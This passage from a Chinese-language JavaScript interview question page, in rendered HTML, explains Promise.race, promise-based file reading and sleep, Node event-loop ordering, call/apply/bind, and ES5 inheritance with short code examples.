punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>thenable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e <span class=\"token operator\">===</span> thenable<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><strong>与promise.all相反的是哪一个</strong></p>\n<p><strong>参考答案：</strong></p>\n<p>Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。</p>\n<p><strong>扩展：</strong></p>\n<p>语法</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Promise.race(iterable);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>参数</p>\n<ul>\n<li><p>iterable</p>\n<p>可迭代对象，类似<code>Array</code></p>\n</li>\n</ul>\n<p>返回值</p>\n<p> 一个<strong>待定的</strong> <code>Promise</code>]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而<strong>异步</strong>地解析或拒绝（一旦堆栈为空）</p>\n<p>33、promise实现文件读取</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// const fs = require(\"fs\");</span>\n<span class=\"token keyword\">import</span> fs <span class=\"token keyword\">from</span> <span class=\"token string\">\"fs\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> path <span class=\"token keyword\">from</span> <span class=\"token string\">\"path\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> __dirname <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span>__dirname<span class=\"token punctuation\">,</span> file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./JavaScript/promise/file/file1.txt\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./JavaScript/promise/file/file1.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"33、用js实现sleep，用promise\"><a href=\"#33、用js实现sleep，用promise\" class=\"headerlink\" title=\"33、用js实现sleep，用promise\"></a>33、用js实现sleep，用promise</h3><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">SLeep_p</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">time</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">SLeep_p</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kif\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"34、js执行顺序的题目，涉及到settimeout、console、process-nextTick、promise-then\"><a href=\"#34、js执行顺序的题目，涉及到settimeout、console、process-nextTick、promise-then\" class=\"headerlink\" title=\"34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then\"></a>34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</h3><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">console<span class=\"token punctuation\">.</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token string\">'start'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">timeEnd</span><span class=\"token punctuation\">(</span><span class=\"token string\">'start'</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nprocess<span class=\"token punctuation\">.</span><span class=\"token function\">nextTick</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>参考答案：</strong></p>\n<p>综合的执行顺序就是： <code>3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2</code></p>\n<p><strong>解析：</strong></p>\n<p>本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：</p>\n<ol>\n<li>所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)</li>\n<li>在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务</li>\n<li>一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行</li>\n<li>主线程不断重复上面的第三步</li>\n</ol>\n<p>在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出<code>3、4、6、8</code>。当主线程任务执行完毕后，再从Event Loop中读取任务。</p>\n<p>Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。</p>\n<p>在Job queue中的队列分为两种类型：</p>\n<p><code>宏任务 Macrotask</code> 宏任务是指Event Loop在<strong>每个阶段</strong>执行的任务</p>\n<p><code>微任务 Microtask</code> 微任务是指Event Loop在<strong>每个阶段之间</strong>执行的任务</p>\n<p>我们举例来看执行顺序的规定，我们假设</p>\n<p>宏任务队列包含任务: A1, A2 , A3</p>\n<p>微任务队列包含任务: B1, B2 , B3</p>\n<p>执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。</p>\n<p>了解完了<code>宏任务 Macrotask</code>和<code>微任务 Microtask</code>两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：</p>\n<p>宏任务 Macrotask队列真实包含任务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">script(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>微任务 Microtask队列真实包含任务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">process.nextTick, Promises, Object.observe, MutationObserver<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由此我们得到的执行顺序应该为：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">script(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs</p></blockquote>\n<p>我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的</p>\n<p>接下来我们分析我们的题目，首先分析Job queue的执行顺序：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）</li>\n<li>process.nextTick: 输出7</li>\n<li>promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)</li>\n<li>setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时</li>\n<li>setTimeout ： 输出2</li>\n</ul>\n<h3 id=\"35、call-appy-bind的作用和区别\"><a href=\"#35、call-appy-bind的作用和区别\" class=\"headerlink\" title=\"35、call appy bind的作用和区别\"></a>35、call appy bind的作用和区别</h3><p><strong>参考答案：</strong></p>\n<p>作用：</p>\n<p> 都可以改变函数内部的this指向。</p>\n<p>区别点：</p>\n<ol>\n<li>call 和 apply 会调用函数，并且改变函数内部this指向。</li>\n<li>call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]</li>\n<li>bind 不会调用函数，可以改变函数内部this指向。</li>\n</ol>\n<p><strong>解析：</strong></p>\n<p>call方法</p>\n<p>改变函数内部this指向</p>\n<p>call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。</p>\n<p>写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数</p>\n<p>call 的主要作用也可以实现继承</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>apply方法</p>\n<p>apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。</p>\n<p>写法：fun.apply(thisArg, [argsArray])</p>\n<ul>\n<li>thisArg:在fun函数运行时指定的this值</li>\n<li>argsArray:传递的值，必须包含在数组里面</li>\n<li>返回值就是函数的返回值，因为他就是调用函数</li>\n</ul>\n<p>apply的主要应用，比如可以利用apply可以求得数组中最大值</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">const arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>bind方法</p>\n<p>bind()方法不会调用函数，但是能改变函数内部this指向</p>\n<p>写法：fun.bind(thisArg, arg1, arg2, …)</p>\n<ul>\n<li>thisArg:在fun函数运行时指定的this值</li>\n<li>arg1,arg2:传递的其他参数</li>\n<li>返回由指定的this值和初始化参数改造的原函数拷贝</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var&#96; &#96;o &#x3D; &#123;&#96;&#96;  &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96;  &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f();<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>bind应用</p>\n<p>如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">const btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96;  &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;   &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96;   &#96;&#96;setTimeout(&#96;&#96;    &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;     &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96;    &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96;    &#96;&#96;2000&#96;&#96;   &#96;&#96;);&#96;&#96;  &#96;&#96;&#125;;&#96;&#96;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>扩展:</strong></p>\n<p>主要应用场景：</p>\n<ol>\n<li>call 经常做继承。</li>\n<li>apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。</li>\n<li>bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。</li>\n</ol>\n<h3 id=\"36、继承，优缺点\"><a href=\"#36、继承，优缺点\" class=\"headerlink\" title=\"36、继承，优缺点\"></a>36、继承，优缺点</h3><p><strong>参考答案：</strong></p>\n<ul>\n<li>继承的好处<ul>\n<li>a：提高了代码的复用性</li>\n<li>b：提高了代码的维护性</li>\n<li>c：让类与类之间产生了关系，是多态的前提</li>\n</ul>\n</li>\n<li>继承的弊端<ul>\n<li>类的耦合性增强了,但是开发的原则：高内聚，低耦合。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"37、ES5-js继承的方法和优缺点\"><a href=\"#37、ES5-js继承的方法和优缺点\" class=\"headerlink\" title=\"37、ES5 js继承的方法和优缺点\"></a>37、ES5 js继承的方法和优缺点</h3><p><strong>参考答案：</strong></p>\n<ol>\n<li><p>原型链继承</p>\n<p>实现方式：将子类的原型链指向父类的对象实例</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"parent\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Parent</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayHi</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Child</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> child <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>child<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nchild<span class=\"token punctuation\">.</span><span class=\"token function\">sayHi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>原理：子类实例child的<code>__proto__</code>指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的<code>__proto__</code>指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法<br>优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性<br>缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\na<span class=\"token punctuation\">.</span>list<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ['a','b']</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>构造函数继承</p>\n<p>实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> id<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">printName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Parent</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">Child</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">Parent</span><span 